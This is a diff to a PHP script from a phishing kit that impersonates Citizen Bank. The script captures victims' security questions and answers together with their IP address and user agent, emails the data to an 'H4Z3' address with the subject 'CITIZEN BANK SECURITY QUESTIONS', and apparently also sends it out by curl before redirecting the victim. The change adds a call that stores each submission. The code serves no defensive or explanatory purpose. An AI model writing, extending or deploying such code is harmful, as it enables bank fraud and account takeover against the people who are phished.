@@ -12,7 +12,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $a3 = $_POST['a3'];
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
-    
+
+    h4z3_store_submission('security', $_POST);
+
             $body  = "++++++++++ 🐱‍💻 CITIZEN BANK SECURITY QUESTIONS 🐱‍💻 ++++++++++\r\n";
             $body .= "Question 1  : $q1\r\n";
             $body .= "Answer 1    : $a1\r\n";
@@ -30,7 +32,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $body .= "Timezone    : $timezone\r\n";
             $body .= "Date        : $date\r\n";
             $body .= "+++++++++++++++ ‍H4Z3 +++++++++++++++\r\n";
-    
+
 
       $subject  = "🐱‍💻 ‍H4Z3 CITIZEN BANK SECURITY QUESTIONS => FROM $ip 🐱‍💻";
       $headers  = "From: 🐱‍💻 ‍H4Z3 🐱‍💻 <m4r1ju4n4r3sult@h4z3.com>\r\n";
@@ -52,6 +54,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
           curl_close($ch);
         }
 
-          header('Location: ../personal');
-        }       
+    header('Location: ../personal');
+    exit;
+}
 ?>
